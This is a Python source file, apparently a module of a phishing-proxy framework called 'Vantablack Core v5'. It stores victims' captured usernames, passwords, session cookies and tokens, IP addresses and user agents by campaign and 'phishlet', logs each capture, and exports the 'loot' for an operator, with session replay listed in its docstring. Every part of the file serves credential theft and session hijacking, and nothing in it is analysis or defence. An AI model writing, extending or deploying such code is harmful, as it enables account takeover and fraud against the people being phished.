"""
Vantablack Core v5 - Session Manager
====================================

Handles:
- Storage of captured credentials (username/password)
- Capture of authentication tokens (cookies, headers)
- Session replay capability
- Export to standardized format (JSON/Loot)
"""

import json
import logging
from typing import Dict, List, Optional
from datetime import datetime
from pydantic import BaseModel

class CapturedCredential(BaseModel):
    username: str
    password: str
    captured_at: datetime
    url: str

class CapturedSession(BaseModel):
    session_id: str
    campaign_id: str
    phishlet_name: str
    remote_ip: str
    user_agent: str
    credentials: List[CapturedCredential] = []
    tokens: Dict[str, str] = {}  # Cookie name -> value
    custom_data: Dict[str, str] = {}
    is_authenticated: bool = False
    created_at: datetime = datetime.utcnow()
    last_activity: datetime = datetime.utcnow()

class SessionManager:
    def __init__(self):
        self.logger = logging.getLogger("vantablack.edge.session")
        self._sessions: Dict[str, CapturedSession] = {}  # In-memory for now, move to Redis later

    def create_session(self, session_id: str, campaign_id: str, phishlet_name: str, ip: str, ua: str) -> CapturedSession:
        """Initialize a new visitor session"""
        session = CapturedSession(
            session_id=session_id,
            campaign_id=campaign_id,
            phishlet_name=phishlet_name,
            remote_ip=ip,
            user_agent=ua,
            created_at=datetime.utcnow(),
            last_activity=datetime.utcnow()
        )
        self._sessions[session_id] = session
        self.logger.info(f"New session created: {session_id} ({ip})")
        return session

    def get_session(self, session_id: str) -> Optional[CapturedSession]:
        return self._sessions.get(session_id)

    def update_activity(self, session_id: str):
        if session := self._sessions.get(session_id):
            session.last_activity = datetime.utcnow()

    def capture_credential(self, session_id: str, username: str, password: str, url: str):
        if session := self._sessions.get(session_id):
            cred = CapturedCredential(
                username=username,
                password=password,
                captured_at=datetime.utcnow(),
                url=url
            )
            session.credentials.append(cred)
            self.logger.warning(f"CREDENTIAL CAPTURED for session {session_id}: {username}")

    def capture_token(self, session_id: str, key: str, value: str):
        if session := self._sessions.get(session_id):
            session.tokens[key] = value
            self.logger.info(f"Token captured for session {session_id}: {key}")
            # If we have tokens, mark as authenticated (heuristic, can be refined)
            session.is_authenticated = True

    def export_loot(self, session_id: str) -> Dict:
        """Export session data for the operator"""
        if session := self._sessions.get(session_id):
            return session.model_dump(mode="json")
        return {}
